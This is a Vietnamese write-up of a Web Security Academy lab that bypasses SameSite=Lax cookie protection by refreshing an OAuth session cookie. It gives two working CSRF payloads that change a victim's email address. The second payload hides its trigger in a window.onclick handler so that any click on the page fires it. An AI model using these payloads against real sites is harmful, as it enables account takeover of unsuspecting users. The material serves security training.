![image](https://github.com/user-attachments/assets/cf0d31c3-24ba-4d04-9cf8-311d9602b826)

![image](https://github.com/user-attachments/assets/26100410-d948-45f5-a0b7-c3c1d394e100)

Ta tiến hành đăng nhập vào và nhận thấy rằng trang web không có show samesite nên mặc định nó sẽ là `lax` và tiếp theo là khi ta thay đổi email thì ko có csrf token dẫn đến đây là 1 chỗ nguy hiểm, attacker có thể tấn công vào.

Tiến hành tạo 1 cuộc tấn công csrf cơ bản

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a4800de035b72b7804d088f007f001d.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="admin&#64;gmail&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

Vậy là đã tạo ra 1 cuộc tấn công cơ bản rồi, nhưng gửi payload này thì chắc chắn sẽ bị chặn :">. vì nó check `samesite: lax`, vậy giờ ta chỉ có thể bypass được cuộc tấn công này là dựa vào 1 lỗ hổng trong cơ chế cấp cookie của `oauth`. Như ta để ý thì khi ta truy cập vào `/social-login` thì nó sẽ được cấp 1 cookie mới khi đã đăng nhập qua `oauth`.

Sau đó, bạn tạm dừng 5 giây để trang đăng nhập hoạt động xong (đây là 1 yếu tố quan trọng và quyết định, phải lưu ý làm đúng), và gửi lại request thay đổi email.

Đó là ý tưởng, bởi vì như bạn biết thì `samesite: lax` thì nó sẽ không cho gửi cookie qua POST rồi còn gì, vì thế ta phải lợi dụng điều này để `oauth` nó cấp cookie cho ta.

Và giờ nếu như chúng ta gửi cho con bot thì vẫn thất bại, tại vì sao nhỉ :"))

Như ta biết thì trình duyệt sẽ chặn popup mở tự động, trừ khi người dùng tương tác với trang (ví dụ: click vào trang). Bạn có thể kiểm chứng :">. test bất kì ở trang nào đó.

Thì bây giờ giải pháp là gì ? Nghĩ đơn giản lại thì bây giờ bạn không cho nó pop up tự động là được, bạn thay vào là phishing, bạn yêu cầu người dùng click vào trang để bật popup. Khi họ click, bạn mở `/social-login` trong một popup để làm mới session và sau đó gửi lại yêu cầu thay đổi email.

Vậy giờ làm sao cho tinh vi?? không thể tạo 1 cái button rồi cho user bấm vào được? rất lộ, thay vào đó ta hãy sử dụng `window.onclick` để khi user bấm vào bất kì vị trí nào trên web thì nó đều kích hoạt event này :"))

Rồi đã xong, tiến hành tạo payload thôi

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0acb008803cdb4b981c34d1f001d00f5.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="admin&#64;gmail&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
  <script>
      window.onclick = () => {
          window.open('https://0acb008803cdb4b981c34d1f001d00f5.web-security-academy.net/social-login');
          setTimeout(changeEmail, 5000);
      }
  
      function changeEmail() {
          document.forms[0].submit();
      }
  </script>
  </body>
</html>
```

![image](https://github.com/user-attachments/assets/07515467-a556-44c2-9520-ea1164ddca7d)

Vậy là thành công
